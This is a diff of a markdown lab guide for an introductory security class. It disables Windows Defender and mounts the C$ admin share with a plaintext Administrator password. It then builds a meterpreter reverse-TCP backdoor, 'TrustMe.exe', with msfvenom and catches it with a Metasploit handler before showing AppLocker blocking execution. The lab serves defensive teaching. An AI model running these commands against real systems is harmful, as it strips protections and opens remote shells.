@@ -11,7 +11,7 @@ Before we begin, we need to disable **Defender**. Start by opening an instance o
 
 Next, run the following command in the **Powershell** terminal:
 
-`Set-MpPreference -DisableRealtimeMonitoring $true`
+<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
 
 ![](attachments/applocker_disabledefender.png)
 
@@ -29,11 +29,11 @@ Alternatively, you can click on the **Kali** icon in the taskbar.
 
 Let's start by getting root access in our terminal.
 
-`sudo su -`
+<pre>sudo su -</pre>
 
 Next, lets run the following command to get our IP address:
 
-`ifconfig`
+<pre>ifconfig</pre>
 
 **Please note the IP address of Y-O-U-R Ethernet adapter.**
 
@@ -43,7 +43,7 @@ Please note that my adapter is called **"eth0"** and my IP address is **"10.10.1
 
 We need to run the following command in order to mount our remote system to the correct directory:
 
-```mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh```
+<pre>mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
 
 Note: The IP address of **10.10.1.209** does not need to be changed in this command.
 
@@ -53,13 +53,11 @@ If you see the following error, it means that the device is already mounted.
 
 If this is the case, just run the following command to navigate into the mounted directory:
 
-```cd /mnt/windows-share```
+<pre>cd /mnt/windows-share</pre>
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-```
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
-```
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
 Now let's start the **Metasploit Handler**.  First, open a new **Kali** instance. The easiest way to do this is by clickin on the Kali icon in the taskbar.
 
@@ -67,7 +65,7 @@ Now let's start the **Metasploit Handler**.  First, open a new **Kali** instance
 
 Before doing anything else, we need to run the following command in our new terminal window:
 
-```msfconsole -q```
+<pre>msfconsole -q</pre>
 
 ![](attachments/msfconsole.png)
 
@@ -75,17 +73,17 @@ The Metasploit Handler successfully ran if the terminal now starts with **"msf6 
 
 Next, let's run the following:
 
-```use exploit/multi/handler```
+<pre>use exploit/multi/handler</pre>
 
 Now run all of the following commands to set the correct parameters:
 
-```set PAYLOAD windows/meterpreter/reverse_tcp```
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-```set LHOST 10.10.1.117```
+<pre>set LHOST 10.10.1.117</pre>
 
 Remember, your IP will be different!
 
-```exploit```
+<pre>exploit</pre>
 
 It should look like this:
 
@@ -99,9 +97,9 @@ Open a Windows command prompt. Do this by clicking on the icon in the taskbar.
 
 Once the prompt is open, let's run the following commands to run the **"TrustMe.exe"** file.
 
-```cd \```
+<pre>cd \</pre>
 
-```TrustMe.exe```
+<pre>TrustMe.exe</pre>
 
 ![](attachments/runtrustme.png)
 
@@ -158,18 +156,21 @@ Open a command prompt and run **"gpupdate"** to force the policy change.
 
 ![](attachments/OpeningWindowsCommandPrompt.png)
 
-```gpupdate /force```
+<pre>gpupdate /force</pre>
 
 We are now going to try to run **"TrustMe.exe"** as another user on the system. 
 
 Run the following commands:
 
-```cd /IntroLabs```
+<pre>cd /IntroLabs</pre>
 
-```runas /user:whitelist "nc"```
+<pre>runas /user:whitelist "nc"</pre>
 
 The password is **adhd**
 
 ![](attachments/runas.png)
 
 As you can see, an error was generated, meaning that we were successful!
+
+***
+[Back to Navigation Menu](/IntroClassFiles/navigation.md)
